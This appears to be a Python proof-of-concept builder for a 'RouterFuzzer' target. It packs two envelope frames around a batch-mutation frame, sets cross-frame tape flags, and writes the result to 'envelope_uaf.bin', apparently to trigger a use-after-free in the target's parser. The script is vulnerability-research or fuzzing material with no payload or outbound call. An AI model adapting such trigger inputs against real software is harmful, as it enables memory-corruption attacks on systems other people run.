#!/usr/bin/env python3
"""Build cross-frame RouterFuzzer PoC: TKR2 + TKR1 mutation + TKR2."""

from __future__ import annotations

import struct
from pathlib import Path

K_ENVELOPE_MAGIC = 0x544B5232
K_BATCH_MAGIC = 0x544B5231
K_WIRE_VERSION = 7

K_ENVELOPE_FLAG_CHANNEL_TAPE = 1 << 1
K_ENVELOPE_FLAG_SEAL_PENDING = 1 << 2
K_ENVELOPE_FLAG_CROSS_FRAME_TAPE = 1 << 5

SESSION_ID = 42


def u32(value: int) -> bytes:
    return struct.pack("<I", value)


def u16(value: int) -> bytes:
    return struct.pack("<H", value)


def encode_envelope_channel(
    channel_id: int,
    kind: int,
    payload_offset: int,
    payload_len: int,
    route_hint: int,
) -> bytes:
    return b"".join(
        u32(x)
        for x in (channel_id, kind, payload_offset, payload_len, route_hint)
    )


def encode_envelope_frame(sequence: int, payload: bytes) -> bytes:
    flags = (
        K_ENVELOPE_FLAG_CHANNEL_TAPE
        | K_ENVELOPE_FLAG_SEAL_PENDING
        | K_ENVELOPE_FLAG_CROSS_FRAME_TAPE
    )
    meta = encode_envelope_channel(0, 0, 0, 0, sequence)
    data = encode_envelope_channel(1, 3, 0, len(payload), 0)
    header = b"".join(
        [
            u32(K_ENVELOPE_MAGIC),
            u16(K_WIRE_VERSION),
            u16(2),
            u32(flags),
            u32(100 + sequence),
            u32(SESSION_ID),
            u32(0),
        ]
    )
    return header + meta + data + payload


def encode_batch_mutation_frame() -> bytes:
    record = b"".join(
        u32(x)
        for x in (1, 100, 200, 5000, 250, 0, 16, 0)
    )
    payload = bytes([0xC0 + (i % 16) for i in range(16)])
    header = b"".join(
        [
            u32(K_BATCH_MAGIC),
            u16(K_WIRE_VERSION),
            u16(28),
            u32(1),
            u32(0),
            u32(SESSION_ID),
            u32(20260730),
            u32(0),
        ]
    )
    return header + record + payload


def build_poc() -> bytes:
    frame1_payload = bytes([0xD0 + (i % 16) for i in range(68)])
    frame1 = encode_envelope_frame(sequence=1, payload=frame1_payload)
    frame2 = encode_batch_mutation_frame()
    frame3_payload = bytes([0xE0 + (i % 16) for i in range(32)])
    frame3 = encode_envelope_frame(sequence=2, payload=frame3_payload)
    return frame1 + frame2 + frame3


def main() -> None:
    poc = build_poc()
    out = Path(__file__).resolve().parents[1] / "envelope_uaf.bin"
    out.write_bytes(poc)
    print(f"Wrote {len(poc)} bytes to {out}")


if __name__ == "__main__":
    main()
